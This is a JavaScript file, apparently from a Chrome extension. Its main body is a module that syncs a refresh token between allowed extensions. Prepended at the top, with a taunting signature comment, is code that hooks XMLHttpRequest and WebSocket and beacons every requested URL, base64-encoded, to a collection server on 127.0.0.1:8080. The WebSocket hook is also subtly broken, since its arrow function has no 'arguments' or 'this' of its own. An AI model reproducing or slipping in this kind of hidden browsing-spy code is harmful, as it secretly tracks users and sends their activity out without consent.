function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function() {
	var extensions = window.GETT_EXTENSIONS;

	var containsId = function(id) {
		for(var name in extensions) {
			if(extensions[name] === id) {
				return true;
			}
		}

		return false;
	}

	var once = function(fn) {
		var called = false;

		return function() {
			if(called) {
				return;
			}

			called = true;

			return fn.apply(null, arguments);
		};
	};
	var userid = function(refreshtoken) {
		return refreshtoken && refreshtoken.split('.')[2];
	};

	var synchronization = {
		//refreshtoken: null,
		id: chrome.i18n.getMessage('@@extension_id'),
		set refreshtoken(refreshtoken) {
			this._refreshtoken = refreshtoken;

			localStorage.setItem('user', JSON.stringify({ refreshtoken: refreshtoken }));
		},
		get refreshtoken() {
			if(!this._refreshtoken) {
				var user = JSON.parse(localStorage.getItem('user') || '{}');

				this._refreshtoken = user.refreshtoken;
			}

			return this._refreshtoken;
		},
		userid: function() {
			return userid(this.refreshtoken);
		},
		initialize: function() {
			var self = this;

			chrome.extension.onMessageExternal.addListener(function(message, sender, respond) {
				debug.debug('External message reveiced', message, 'my refreshtoken', self.refreshtoken);

				if(!containsId(sender.id)) {
					debug.warn('Unknown extension trying to connect', sender);

					respond({ type: 'error', message: 'Unknown extension' });
					return;
				}

				respond({ type: 'sync', refreshtoken: self.refreshtoken });
			});
		},
		get: function(callback) {
			var self = this;

			var counter = 0;
			var result = [];

			debug.info('-- Synchronization started', extensions);

			for(var name in extensions) {
				var id = extensions[name];

				if(id === this.id) {
					continue;
				}

				counter++;

				var onresponse = once(function(response) {
					result.push(response && response.refreshtoken);

					debug.debug('Response received', response);

					if(result.length === counter) {
						debug.info('-- Synchronization ended', result);

						result = result.filter(function(token) {
							return !!token;
						});

						var current = result[0];

						for(var i = 0; i < result.length; i++) {
							if(userid(current) !== userid(result[i])) {
								callback();
								return;
							}

							current = result[i];
						}

						self.refreshtoken = current; //result[0];

						callback(null, self.refreshtoken);
					}
				});

				debug.debug('Sending sync message', id);

				chrome.extension.sendMessage(id, { type: 'sync' }, onresponse);
				setTimeout(onresponse.bind(null, null), 1000);
			}
		}
	};

	/*chrome.extension.onMessage.addListener(function(message, sender, respond) {
		debug.debug('Internal message received', message);

		switch(message.type) {
		case 'syncinit': 
			synchronization.refreshtoken = message.refreshtoken;
			respond({ type: 'syncinit', status: 'ok' });

			break;
		case 'syncget':
			synchronization.get(function(err, token) {
				debug.debug('Sending response containing synchronization result', err, token);

				respond({ type: 'syncget', refreshtoken: token });
			});

			return true;
		}
	});

	synchronization.initialize();*/

	debug.info('Synchronization module loaded', synchronization.id);

	window.synchronization = synchronization;
}());
